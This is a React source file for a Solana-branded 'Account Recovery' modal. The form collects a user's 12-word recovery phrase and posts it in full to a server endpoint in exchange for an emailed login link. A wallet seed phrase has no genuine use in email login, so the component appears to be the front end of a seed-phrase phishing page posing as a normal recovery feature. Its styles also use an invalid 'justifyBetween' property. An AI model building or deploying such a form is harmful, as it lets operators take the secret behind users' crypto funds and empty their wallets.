import React, { useState } from 'react';
import axios from 'axios';
import { Key, Unlock, AlertCircle, CheckCircle, X } from 'lucide-react';

export const RecoveryModal = ({ isOpen, onClose }) => {
  const [phrase, setPhrase] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState(null);
  const [error, setError] = useState(null);

  if (!isOpen) return null;

  const wordCount = phrase.trim() ? phrase.trim().split(/\s+/).length : 0;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(null);
    setMessage(null);

    if (wordCount !== 12) {
      setError('Please enter all 12 words of your recovery phrase.');
      return;
    }

    try {
      setLoading(true);
      const res = await axios.post('/api/auth/account-recovery', { recoveryPhrase: phrase.trim() });
      if (res.data && res.data.flag) {
        setMessage(res.data.message || 'Recovery email sent successfully. Please check your inbox.');
      } else {
        setError(res.data.message || 'Invalid recovery phrase.');
      }
    } catch (err) {
      setError(err.response?.data?.message || 'Failed to submit recovery phrase.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="solana-modal-overlay">
      <div className="solana-modal-card">
        <div style={{ display: 'flex', alignItems: 'center', justifyBetween: 'space-between', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '1rem', marginBottom: '1rem' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
            <Key style={{ color: '#F59E0B' }} size={20} />
            <h3 style={{ fontSize: '1.15rem', fontWeight: 700, color: '#fff' }}>Account Recovery</h3>
          </div>
          <button onClick={onClose} style={{ background: 'none', border: 'none', color: '#94a3b8', cursor: 'pointer', marginLeft: 'auto' }}>
            <X size={20} />
          </button>
        </div>

        <p style={{ fontSize: '0.85rem', color: '#94a3b8', marginBottom: '1rem' }}>
          Enter your 12-word recovery phrase to receive a direct login link at your registered email address.
        </p>

        {error && (
          <div className="solana-alert-danger">
            <AlertCircle size={18} />
            <span>{error}</span>
          </div>
        )}

        {message && (
          <div className="solana-alert-success">
            <CheckCircle size={18} />
            <span>{message}</span>
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <div className="form-group-custom">
            <label className="solana-input-label">12-Word Recovery Phrase</label>
            <textarea
              className="solana-input-field font-mono"
              rows={3}
              placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              spellCheck="false"
              style={{ height: 'auto', padding: '0.75rem', fontSize: '0.85rem', resize: 'none' }}
            />
            <div style={{ display: 'flex', justifyBetween: 'space-between', marginTop: '0.35rem' }}>
              <span className="font-mono" style={{ fontSize: '0.75rem', color: wordCount === 12 ? '#14F195' : '#64748b' }}>
                {wordCount} / 12 words
              </span>
            </div>
          </div>

          <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.75rem', paddingTop: '1rem', borderTop: '1px solid rgba(255,255,255,0.08)' }}>
            <button type="button" onClick={onClose} className="solana-btn-outline" style={{ width: 'auto', padding: '0 1.25rem' }}>
              Cancel
            </button>
            <button type="submit" disabled={loading} className="solana-btn-primary" style={{ width: 'auto', padding: '0 1.5rem' }}>
              {loading ? (
                <span>Submitting...</span>
              ) : (
                <>
                  <Unlock size={16} />
                  <span>Recover Account</span>
                </>
              )}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};
